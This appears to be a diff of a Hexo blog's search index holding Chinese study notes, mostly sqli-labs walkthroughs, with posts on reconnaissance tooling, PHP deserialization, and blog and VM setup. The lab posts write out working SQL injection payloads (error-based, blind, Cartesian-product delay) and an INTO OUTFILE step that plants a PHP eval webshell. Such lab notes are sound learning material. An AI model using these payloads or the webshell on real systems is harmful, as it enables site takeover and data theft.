+<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),查询语句) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
+<p><img src="/../images/1731124371854.jpg" alt="1731124371854" loading="lazy"></p>
+<p>（注意1是报错输出的一部分，无视就好了）</p>
+<p>接下来我们便可以查询我们想要数据了。</p>
+<p>例如查表名</p>
+<p><img src="/../images/1731126185859.jpg" alt="1731126185859" loading="lazy"></p>
+<p><strong>记得给查询语句加括号 : )</strong></p>
+<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>和第五题差不多，只要把单引号换成双引号就行。</p>
+<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>根据前面的知识我们可以知道本题为单引号双括号注入。</p>
+<p><img src="/../images/%E5%9B%BE%E7%89%871.jpg" alt="图片1" loading="lazy"></p>
+<p>根据提示我们需要用到 <strong>into outfile</strong> 来写入一句话木马以便我们使</p>
+<p>用工具来控制网站。</p>
+<p>使用方法为 <strong>select … into outfile “绝对路径”</strong> ，这里我们也需要</p>
+<p>使用 union select。</p>
+<p>这段代码可以将 select 的内容注入进绝对路径下的一个文件，我</p>
+<p>们这里注入到一个 7.php 的文件下，如果没有这个文件会自动创</p>
+<p>建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最</p>
+<p>好一次成功，如果要再次写入则需要更换文件名。</p>
+<p>这里使用 into outfile 需要有写入权限与绝对路径，由于靶场是我</p>
+<p>们自己搭建的，很容易知道网站的绝对路径，至于写入权限我们</p>
+<p>可以在终端中查看。<img src="/../images/%E5%9B%BE%E7%89%872.jpg" alt="图片2" loading="lazy"></p>
+<p>如果 secure_file_priv 为 null，在 MySQL 版本低于 5.7.6 是默认任</p>
+<p>意写入的，我这里是更高的版本代表禁止写入，所以要在配置文</p>
+<p>件 my.ini 中加入 <strong>secure_file_priv&#x3D;”\”</strong>便有写入权限。</p>
+<p>接下来便可开始进行注入，PHP 格式的一句话木马为：</p>
+<p><strong><?php @eval($_POST['mima']);?></strong> </p>
+<p>“mima”是我们之后用工具需要的密码</p>
+<p>所以我们的注入语句为<code>?id=1’)) union select 1,2,’&lt;?php@eval($_POST[‘mima’]);?&gt;’ into outfile &quot;C:\\PHP\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test.php&quot;--+</code></p>
+<p><img src="/../images/%E5%9B%BE%E7%89%873.jpg" alt="图片3" loading="lazy"></p>
+<p>虽然报错的，但我们打开文件夹可以看到已经有文件存在了</p>
+<p>接下来就可以使用 webshell 工具（这里以蚁剑为例）</p>
+<p><img src="/../images/%E5%9B%BE%E7%89%874.jpg" alt="图片4" loading="lazy"></p>
+<p>连接成功。我们便可以对网站进行操控。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less50-53</title>
+    <url>/2025/02/19/less50-53/</url>
+    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
+<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
+<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
+<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
+<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>photos</title>
+    <url>/2024/08/05/photos/</url>
+    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>less8-17</title>
+    <url>/2024/11/16/less8-17/</url>
+    <content><![CDATA[<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>和之前的第五关一样可以用因为正确查询和错误查询的页面不同而使用布尔盲注，脚本如何写后续再更新: )</p>
+<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>由于查询正确与否的页面相同，这边得使用时间盲注。</p>
+<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>同第九关，不过是双引号闭合。</p>
+<h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>直接看源码<img src="/../images/1731767328998.jpg" alt="1731767328998" loading="lazy"></p>
+<p>发现这关是通过post传输的账户密码，且为单引号闭合，但换汤不换药，我们使用的查询语句是和之前的一样的。我们在username这进行注入便可以注释掉后面检查密码的语句。</p>
+<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>直接看源码</p>
+<p><img src="/../images/1731807941898(1).jpg" alt="1731807941898(1)" loading="lazy"></p>
+<p>发现和less11一样，不过是被双引号和括号包围。</p>
+<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>正确查询时无回显，而报错有回显错误信息，我们可以想到less5，同样可以用盲注或者双查询注入。</p>
+<h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><p>同13关，不过是闭合方式变成了双引号。</p>
+<h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><p>直接看代码</p>
+<p><img src="/../images/1731811151864.jpg" alt="1731811151864" loading="lazy"></p>
+<p>发现正确查询和错误查询的回显是一样的（除了那个图片），那么我们可以使用盲注。我们这里先尝试时间盲注，我们用if(x,y,z),如果x为true则返回y，否则z。</p>
+<p>我们便可以编辑出这样的注入<code>1&#39; or if(查询语句,sleep(1),1)-- </code>,如果正确查询，则 让页面延迟，如果错误则返回1无延迟。感觉这样效率比<code>1&#39; or if(查询语句,1,sleep(1))-- </code>高点。后续可以用脚本进行批量测试。</p>
+<h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><p>发现和上一关一样，只是变成了双引号+括号闭合。</p>
+<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>打开源代码，发现和之前不一样的是多出来了一堆检查输入的代码。</p>
+<p><img src="/../images/1731917093305(1).jpg" alt="1731917093305(1)" loading="lazy"></p>
+<p>让我们看看各个函数分别是什么意思</p>
+<p>**get_magic_quotes_gpc():**检查魔法引号是否有开启，魔法引号就是PHP 会自动对所有通过 <code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code> 等方式接收到的用户输入的特殊字符进行转义，即在符号前加上\来转义。</p>
+<p><strong>stripslashes:</strong> 函数移除输入中被魔法引号加入的反斜杠。</p>
+<p><strong>ctype_digit：</strong>检查输入是否为存数字。</p>
+<p><strong>mysql_real_escape_string：</strong>在输入中将特殊字符转义，比魔法引号转义的范围小，且是手动引用。**<code>\x00</code>（NULL 字符）** -&gt; 转义为 <code>\\0</code></p>
+<p>​	<strong>反斜杠（<code>\</code>）</strong> -&gt; 转义为 <code>\\</code></p>
+<p>​	<strong>单引号（<code>&#39;</code>）</strong> -&gt; 转义为 <code>\&#39;</code></p>
+<p>​	<strong>双引号（<code>&quot;</code>）</strong> -&gt; 转义为 <code>\&quot;</code></p>
+<p>​	<strong><code>	\x1a</code>（十六进制）</strong> -&gt; 转义为 <code>\\Z</code></p>
+<p><strong>intval：</strong>将输入转化成整形。</p>
+<p>最后返回修改后的变量。</p>
+<p>最后发现他只对用户名的输入进行检查，那么我们便可以在密码中进行注入。但前提是要获取一个合法的用户名。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客的创建</title>
+    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>思科</title>
+    <url>/2024/11/11/%E6%80%9D%E7%A7%91/</url>
+    <content><![CDATA[<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111161000.jpg" alt="微信图片_20241111161000" loading="lazy"></p>
+<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111160951.jpg" alt="微信图片_20241111160951" loading="lazy"></p>
+]]></content>
+      <tags>
+        <tag>思科模拟器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>外网信息收集</title>
+    <url>/2025/02/17/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p><strong>参考奇安信攻防社区</strong></p>
+<h2 id="0x00-常用工具、资源简记："><a href="#0x00-常用工具、资源简记：" class="headerlink" title="0x00 常用工具、资源简记："></a>0x00 常用工具、资源简记：</h2><table>
+<thead>
+<tr>
+<th align="left">工具、网站</th>
+<th align="left">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><a href="https://www.aizhan.com/">爱站</a>、<a href="https://tool.chinaz.com/">站长工具</a></td>
+<td align="left">Whois、备案号、权重、公司名称等</td>
+</tr>
+<tr>
+<td align="left"><a href="https://www.tianyancha.com/">天眼查</a>、<a href="https://www.qichacha.com/">企查查</a>、<a href="https://wx.sogou.com/">搜狗搜索引擎</a></td>
+<td align="left">公司注册域名、微信公众号、APP、软件著作权等</td>
+</tr>
+<tr>
+<td align="left"><a href="https://www.zoomeye.org/">ZoomEye</a>、<a href="https://shodan.io/">Shodan</a>、<a href="https://fofa.so/">FOFA</a>、<a href="https://0.zone/">0.Zone</a>、<a href="https://quake.360.cn/quake/#/index">quake</a></td>
+<td align="left">网络空间资产搜索引擎</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/wgpsec/ENScan_GO">ENScanGo</a>、<a href="https://beian.miit.gov.cn/#/Integrated/index">ICP备案</a></td>
+<td align="left">主域名收集</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/shmilylty/OneForAll">OneForAll</a>、<a href="https://github.com/euphrat1ca/LayerDomainFinder">Layer</a>、<a href="https://opendata.rapid7.com/">Rapid7的开源数据项目</a>、<a href="https://github.com/UnaPibaGeek/ctfr">ctfr</a>、<a href="https://github.com/FortyNorthSecurity/EyeWitness">EyeWitness</a></td>
+<td align="left">子域名收集</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/lcvvvv/kscan">Kscan</a>、<a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe_0x727</a>、<a href="https://github.com/TophantTechnology/ARL">ARL灯塔</a>、<a href="https://gobies.org/">Goby</a></td>
+<td align="left">自动化、批量信息收集</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/dr0op/bufferfly">Bufferfly</a>、<a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a></td>
+<td align="left">资产处理、信息筛选</td>
+</tr>
+<tr>
+<td align="left"><a href="https://dnsdb.io/zh-cn/">dnsdb</a>、<a href="https://github.com/christophetd/CloudFlair">CloudFlair</a></td>
+<td align="left">CDN相关</td>
+</tr>
+<tr>
+<td align="left"><a href="https://www.virustotal.com/">VirusTotal</a>、<a href="https://x.threatbook.cn/">微步</a>、<a href="https://github.com/Sma11New/ip2domain">ip2domain</a></td>
+<td align="left">C段、域名&#x2F;ip情报信息</td>
+</tr>
+<tr>
+<td align="left"><a href="https://nmap.org/">Nmap</a>、<a href="https://github.com/robertdavidgraham/masscan">Masscan</a></td>
+<td align="left">端口服务信息</td>
+</tr>
+<tr>
+<td align="left">Google Hacking、<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>、<a href="https://github.com/pingc0y/URLFinder">URLFinder</a></td>
+<td align="left">WEB站点信息、api接口等</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></td>
+<td align="left">waf识别</td>
+</tr>
+<tr>
+<td align="left"><a href="http://www.yunsee.cn/">云悉</a>、<a href="http://finger.tidesec.net/home/index/index.html">潮汐</a>、<a href="https://www.whatweb.net/">WhatWeb</a></td>
+<td align="left">在线CMS识别</td>
+</tr>
+<tr>
+<td align="left"><a href="https://www.qimai.cn/">七麦</a>、<a href="https://www.xiaolanben.com/pc">小蓝本</a></td>
+<td align="left">APP资产</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/TheKingOfDuck/ApkAnalyser">ApkAnalyser</a></td>
+<td align="left">App敏感信息</td>
+</tr>
+<tr>
+<td align="left"><a href="https://wy.zone.ci/">乌云漏洞库</a>、<a href="http://www.cnnvd.org.cn/">CNVD</a>、<a href="https://github.com/tomnomnom/waybackurls"><strong>waybackurls</strong></a></td>
+<td align="left">历史漏洞、历史资产等</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/n0tr00t/Sreg">n0tr00t&#x2F;Sreg</a>、reg007</td>
+<td align="left">个人隐私信息</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/obheda12/GitDorker">GitDorker</a></td>
+<td align="left">资产信息、源码泄露</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/laramies/theHarvester">theHarvester</a>、<a href="https://app.snov.io/">Snov.io</a></td>
+<td align="left">邮箱信息收集</td>
+</tr>
+<tr>
+<td align="left"><a href="https://start.me/p/GE7JQb/osint">OSINT开源情报和侦擦工具</a></td>
+<td align="left">开源情报资源导航</td>
+</tr>
+<tr>
+<td align="left"><a href="https://github.com/cnrstar/anti-honeypot">anti-honeypot</a>、<a href="https://send-safe-honeypot-hunter.apponic.com/">Honeypot Hunter</a></td>
+<td align="left">蜜罐识别</td>
+</tr>
+</tbody></table>
+<h1 id="收集主域名信息"><a href="#收集主域名信息" class="headerlink" title="收集主域名信息"></a>收集主域名信息</h1><p><strong>作用：可通过域名信息获取：主域名、存活站点、关联信息、钓鱼信息。为漏洞挖掘提供数据支撑。</strong></p>
+<h2 id="1-ICP备案"><a href="#1-ICP备案" class="headerlink" title="1.ICP备案"></a>1.ICP备案</h2><p><em>国内服务器线上运营都必须先办理ICP备案后才能上线。</em></p>
+<p>查询网站：<a href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></p>
+<h3 id="公安部备案查询"><a href="#公安部备案查询" class="headerlink" title="公安部备案查询"></a>公安部备案查询</h3><h3 id="第三方站点"><a href="#第三方站点" class="headerlink" title="第三方站点"></a>第三方站点</h3><ul>
+<li>ICP备案查询-站长工具</li>
+<li>SEO综合查询</li>
+</ul>
+<h3 id="未备案域名查询"><a href="#未备案域名查询" class="headerlink" title="未备案域名查询"></a>未备案域名查询</h3><ul>
+<li>已知网站信息获取（如，网站站点导航可能会包含未备案的站点）</li>
+<li>网络空间引擎进行证书、图标关联搜索。例如：fofa指定搜索规则 <code>is_domain=true</code>，即表示只返回域名*(个人感觉国外shodan、国内fofa)*。</li>
+</ul>
+<h2 id="2-whois"><a href="#2-whois" class="headerlink" title="2.whois"></a>2.whois</h2><p>通过whois信息可以获取注册人的关键信息。如注册商、联系人、联系邮箱、联系电话，也可以对注册人、邮箱、电话反查域名，也可以通过搜索引擎进一步挖掘域名所有人的信息。深入可社工、可漏洞挖掘利用。</p>
+<ul>
+<li><p>站长之家</p>
+<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p>
+</li>
+<li><p>Bugscanner</p>
+<p><a href="http://whois.bugscaner.com/">http://whois.bugscaner.com</a></p>
+</li>
+<li><p>国外BGP</p>
+<p><a href="https://bgp.he.net/">https://bgp.he.net</a></p>
+</li>
+<li><p>who.is</p>
+<p><a href="https://who.is/">https://who.is/</a></p>
+</li>
+<li><p>IP138网站</p>
+<p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
+</li>
+<li><p>域名信息查询-腾讯云</p>
+<p><a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p>
+</li>
+<li><p>ICANN LOOKUP</p>
+<p><a href="https://lookup.icann.org/">https://lookup.icann.org/</a></p>
+</li>
+<li><p>狗狗查询</p>
+<p><a href="https://www.ggcx.com/main/integrated">https://www.ggcx.com/main/integrated</a></p>
+</li>
+</ul>
+<h3 id="3-IP反查"><a href="#3-IP反查" class="headerlink" title="3. IP反查"></a>3. IP反查</h3><blockquote>
+<p>ps:</p>
+<ul>
+<li>目标可能存在多个域名绑定于同一ip上，通过ip反查可以获取到其他域名信息。比如旁站。<ul>
+<li><em>通过获取目标真实IP后，进行反查的旁站更真实。</em></li>
+</ul>
+</li>
+<li>查询站点需复杂性，单一的站点会有反查不出信息的可能。<ul>
+<li><em>大型企业不同的站点收录可能不一样</em></li>
+<li><em>个人推荐3个不同站点反查</em></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h4 id="如何查询"><a href="#如何查询" class="headerlink" title="如何查询"></a>如何查询</h4><p><strong>在线查询网站</strong>：</p>
+<ul>
+<li><a href="http://s.tool.chinaz.com/same">同IP网站查询，同服务器网站查询 - 站长工具</a></li>
+<li><a href="https://dnslytics.com/">Dnslytics</a></li>
+<li><a href="https://site.ip138.com/">iP或域名查询</a></li>
+</ul>
+<p><strong>搜索引擎</strong>：</p>
+<ul>
+<li>shodan</li>
+<li>bing</li>
+<li>fofa</li>
+</ul>
+<h1 id="看不完太长了"><a href="#看不完太长了" class="headerlink" title="看不完太长了"></a>看不完太长了</h1>]]></content>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>笛卡尔积延时注入</title>
+    <url>/2025/01/21/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h1><p>如果一个网站存在基于时间的盲注，而恰好sleep这类核心函数被过滤的话，我们便可以使用。</p>
+<h1 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h1><p><strong>数学表示：</strong></p>
+<ul>
+<li>A &#x3D; {a1, a2, …, am}</li>
+<li>B &#x3D; {b1, b2, …, bn}</li>
+</ul>
+<p>那么笛卡尔积为</p>
+<ul>
+<li>A×B &#x3D; {(a1, b1), (a1, b2), …, (a1, bn), (a2, b1), …, (am, bn)}</li>
+</ul>
+<p><strong>数据库中：</strong></p>
+<p>若执行：</p>
+<p><code>SELECT * FROM TableA, TableB;</code></p>
+<p>TableA:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | name |</span><br><span class="line">|----|------|</span><br><span class="line">| 1  | Alice|</span><br><span class="line">| 2  | Bob  |</span><br></pre></td></tr></table></figure>
+
+<p>TableB:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | age |</span><br><span class="line">|----|-----|</span><br><span class="line">| 1  | 25  |</span><br><span class="line">| 2  | 30  |</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>SELECT * FROM TableA, TableB;</code> 后的结果将是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| TableA.id | TableA.name | TableB.id | TableB.age |</span><br><span class="line">|-----------|-------------|-----------|------------|</span><br><span class="line">| 1         | Alice       | 1         | 25         |</span><br><span class="line">| 1         | Alice       | 2         | 30         |</span><br><span class="line">| 2         | Bob         | 1         | 25         |</span><br><span class="line">| 2         | Bob         | 2         | 30         |</span><br></pre></td></tr></table></figure>
+
+<p>可以看到查询结果是两个表的笛卡尔积。</p>
+<h1 id="利用笛卡尔积进行延时注入"><a href="#利用笛卡尔积进行延时注入" class="headerlink" title="利用笛卡尔积进行延时注入"></a>利用笛卡尔积进行延时注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果查询的表中含有大量数据，数据库进行计算时需要一段时间，进而产生延时的效果。我们便可以通过是否有延时来判断某个条件是否正确。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>select * from admin where id = 1 and (条件语句) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</code><br>通过是否有延时效果产生来判断条件语句是否正确。</p>
+<h1 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>根据是否产生延时(可通过不同个查询结果的笛卡尔积来控制)来判断条件语句是否正确</p>
+<h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p>**time.time():**它返回自1970年1月1日00:00:00 (UTC) 至当前时间的秒数，这是一个浮点数。这个值通常被称为“Unix时间戳”。可用于计算延时时间。</p>
+<p>**requests.get（url）:**requests.get 是 requests库中的一个函数，用于执行HTTP GET请求</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>这里以sql-lib less5（虽然这题布尔盲注也能做：)   )为例</p>
+<p><strong>爆库名长度</strong></p>
+<p><img src="/../images/1737534128492.jpg" alt="1737534128492" loading="lazy"></p>
+<p>为8</p>
+<p><strong>爆库名</strong></p>
+<p><img src="/../images/1737534277746.jpg" alt="1737534277746" loading="lazy"></p>
+<p><strong>爆表名</strong></p>
+<p><img src="/../images/1737534388694.jpg" alt="1737534388694" loading="lazy"></p>
+<p>以此类推，只要改变条件语句便能得到想要的信息。</p>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>报错注入</title>
+    <url>/2024/12/25/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h1><p>见less7</p>
+<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p><strong>updatexml‌函数的基本语法：</strong><br>updatexml(xml_document, XPath_string, new_value)</p>
+<p>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
+<h5 id="XPath语法基础"><a href="#XPath语法基础" class="headerlink" title="XPath语法基础"></a>XPath语法基础</h5><p>XPath是一种在XML文档中查找信息的语言，使用路径表达式来选取节点。XPath支持多种节点类型，包括元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XPath语法使用<strong>关系运算符（如&#x2F;和&#x2F;&#x2F;）</strong>来连接步骤，描述节点的位置关系‌</p>
+<p><strong>正确使用时：</strong></p>
+<p><code>updatexml(&#39;&lt;h1&gt;hello&lt;/h1&gt;&#39;,&#39;/h1&#39;,&#39;x&#39;)</code></p>
+<p>这个语法的作用是将hello换成了x。</p>
+<p><strong>报错时的使用：</strong></p>
+<p>我们可以通过修改XPath的语句进而构成语法错误。</p>
+<p>例如：<code>updatexml(&#39;hello&#39;,concat(&#39;--&#39;,(select version()),&#39;--&#39;),&#39;x&#39;)</code></p>
+<p>这样就会爆出类似<code>XPATH syntax error : &#39;--5.7.26--&#39;</code>的语句。</p>
+<h1 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h1><p><strong>extractvalue‌函数的基本语法</strong><br><code>extractvalue(xml_frag, xpath_expr)</code><br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
+<p><strong>例如</strong></p>
+<p><code>extractvalue(1,concat(0x7e,(select database())))</code></p>
+<p>便会返回数据库名称。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机的搭建</title>
+    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>攻防世界</title>
+    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
+<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP反序列化标识符含义：</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
+<p><strong>原理：</strong></p>
+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
+<p>以下是漏洞中可能遇到的魔法方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
+
+<p><em>例题</em></p>
